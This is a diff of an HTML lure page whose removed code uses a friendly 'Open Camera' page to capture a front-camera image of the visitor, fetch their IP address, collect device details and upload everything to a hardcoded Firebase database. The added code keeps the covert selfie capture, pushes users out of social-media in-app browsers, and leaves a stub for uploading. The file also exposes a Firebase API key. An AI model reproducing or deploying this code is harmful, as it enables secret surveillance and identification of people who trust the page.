@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Sender</title>
+    <title>Camera Access</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -17,37 +17,6 @@
         h1 {
             color: #00ff00;
             margin-top: 20px;
-        }
-        video {
-            width: 100%;
-            height: auto;
-            border: 2px solid green; /* Make video visible with a green border */
-            display: none; /* Initially hide the video until permission is granted */
-        }
-        #loading-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: #ffffff;
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-        #loading-message {
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .error-message {
-            color: #ff0000;
-            margin: 10px 0;
-        }
-        .info-message {
-            color: #ffff00;
-            margin: 10px 0;
         }
         .open-button {
             background-color: #00cc00;
@@ -63,147 +32,83 @@
         .open-button:hover {
             background-color: #009900;
         }
+        #video {
+            width: 100%;
+            height: auto;
+            display: none; /* Initially hidden */
+        }
+        #screenshot {
+            margin-top: 20px;
+            display: none; /* Initially hidden */
+        }
     </style>
 </head>
 <body>
     <h1>Welcome!</h1>
-    <p>Click below to open the camera functionality.</p>
-    <a href="camera.html" target="_blank" class="open-button">Open Camera</a> <!-- Link to camera functionality page -->
-    <div id="loading-screen">
-        <div id="loading-message">
-            <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
-        </div>
-    </div>
-    <video id="video" autoplay playsinline muted></video> <!-- Added muted attribute for mobile -->
-    <div id="error-message" class="error-message"></div>
-    <div id="info-message" class="info-message"></div>
+    <p>Click below to access the camera functionality.</p>
+    <button class="open-button" id="openCamera">Open Camera</button>
 
-    <script type="module">
-        // Existing Firebase configuration code
-        const firebaseConfig = {
-            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4", // Your API Key
-            authDomain: "maptracker-7afb6.firebaseapp.com", // Your Auth Domain
-            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com", // Your Database URL
-            projectId: "maptracker-7afb6", // Your Project ID
-            storageBucket: "maptracker-7afb6.appspot.com", // Your Storage Bucket
-            messagingSenderId: "874600101063", // Your Messaging Sender ID
-            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2", // Your App ID
-            measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
+    <video id="video" autoplay playsinline></video>
+    <canvas id="screenshot"></canvas>
+
+    <script>
+        const openCameraButton = document.getElementById('openCamera');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('screenshot');
+        const context = canvas.getContext('2d');
+
+        openCameraButton.onclick = async function() {
+            const cameraUrl = "https://frankwesseling132.github.io/my-html-site/camera.html"; // Replace with your camera page URL
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            // Check if the user is on a mobile device
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
+            const isInAppBrowser = /FBAN|FBAV|Instagram|Twitter/i.test(userAgent); // Check for in-app browsers
+
+            if (isMobile && isInAppBrowser) {
+                // Inform user to open in a standard browser
+                alert("For the best experience, please open this link in your standard web browser.");
+
+                // Try to open the URL with a custom scheme (some browsers might support it)
+                window.open(cameraUrl, '_system'); // '_system' opens the default browser on some platforms
+            } else {
+                // Request camera access
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    video.srcObject = stream;
+                    video.style.display = 'block'; // Show video element
+                    
+                    // Load the camera for 20 seconds
+                    setTimeout(() => {
+                        takeScreenshot();
+                    }, 20000); // 20 seconds
+                } catch (error) {
+                    console.error("Error accessing camera:", error);
+                }
+            }
         };
 
-        // Initialize Firebase
-        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
-        const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
+        function takeScreenshot() {
+            // Draw the video frame to the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            uploadScreenshot(imageData);
 
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-        
-        const loadingScreen = document.getElementById('loading-screen');
-        const errorMessage = document.getElementById('error-message');
-        const infoMessage = document.getElementById('info-message');
-        const videoElement = document.getElementById('video');
-
-        async function startProcess() {
-            loadingScreen.style.display = 'flex'; // Show loading screen
-
-            try {
-                // Get the user's IP address
-                const ipAddress = await getIpAddress();
-                
-                // Get device info
-                const deviceInfo = await getDeviceInfo(ipAddress);
-
-                // Start the camera and stream video
-                const stream = await startCamera();
-
-                // Show the video element immediately
-                videoElement.style.display = 'block'; // Show video after permission is granted
-
-                // Automatically take a screenshot and upload the data immediately after
-                setTimeout(async () => {
-                    const screenshot = await takeScreenshot(stream);
-                    await uploadSessionData(deviceInfo, screenshot); // Upload right after taking the screenshot
-                }, 500); // Wait 0.5 seconds to stabilize before taking a screenshot
-
-                // Keep the camera running for 20 seconds
-                setTimeout(() => {
-                    // Stop the camera after 20 seconds
-                    stopCamera(stream);
-                }, 20000); // 20 seconds
-
-            } catch (error) {
-                errorMessage.innerHTML = error.message;
-            } finally {
-                loadingScreen.style.display = 'none'; // Hide loading screen
-            }
+            // Optionally, show the screenshot on the page
+            canvas.style.display = 'block';
         }
 
-        async function startCamera() {
-            const constraints = {
-                video: {
-                    facingMode: { ideal: "user" }, // Use front camera
-                    width: { ideal: 1280 },         // Desired width
-                    height: { ideal: 720 },         // Desired height
-                    frameRate: { ideal: 30 }        // Desired frames per second
-                }
-            };
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                videoElement.srcObject = stream;
-                videoElement.style.display = 'block'; // Show video element after getting stream
-                return stream;
-            } catch (error) {
-                throw new Error("Unable to access the camera. Please ensure your device has a front camera and permissions are granted.");
-            }
+        async function uploadScreenshot(imageData) {
+            // Here you can implement the logic to upload the screenshot data to your server or Firebase
+            console.log("Screenshot taken and ready to upload:", imageData);
+            // Example: await uploadToServer(imageData);
         }
 
-        async function takeScreenshot(stream) {
-            return new Promise((resolve) => {
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                canvas.width = 1280; // Set to desired width
-                canvas.height = 720; // Set to desired height
-
-                context.drawImage(videoElement, 0, 0); // Draw the video frame to the canvas
-                resolve(canvas.toDataURL('image/png')); // Return the screenshot as a base64 string
-            });
-        }
-
-        async function getIpAddress() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
-
-        async function getDeviceInfo(ipAddress) {
-            return {
-                userAgent: navigator.userAgent,
-                deviceMemory: navigator.deviceMemory || 'N/A', // Device memory in GB
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', // Number of logical processors
-                screenResolution: `${window.screen.width} x ${window.screen.height}`, // Screen resolution
-                language: navigator.language || 'en-US', // User language
-                platform: navigator.platform || 'N/A', // User platform
-                ipAddress: ipAddress, // User IP address
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // User timezone
-            };
-        }
-
-        async function uploadSessionData(deviceInfo, screenshot) {
-            const sessionData = {
-                timestamp: Date.now(),
-                screenshot: screenshot,
-                ...deviceInfo // Spread device info into session data
-            };
-            const dataRef = ref(database, 'sessions/' + Date.now()); // Unique session ID based on the timestamp
-            await set(dataRef, sessionData);
-            console.log('Session data uploaded successfully');
-        }
-
-        function stopCamera(stream) {
-            const tracks = stream.getTracks();
-            tracks.forEach(track => track.stop()); // Stop all tracks
-            videoElement.style.display = 'none'; // Hide video element
-        }
+        // Set canvas dimensions to match the video size
+        video.onloadedmetadata = function() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+        };
     </script>
 </body>
 </html>
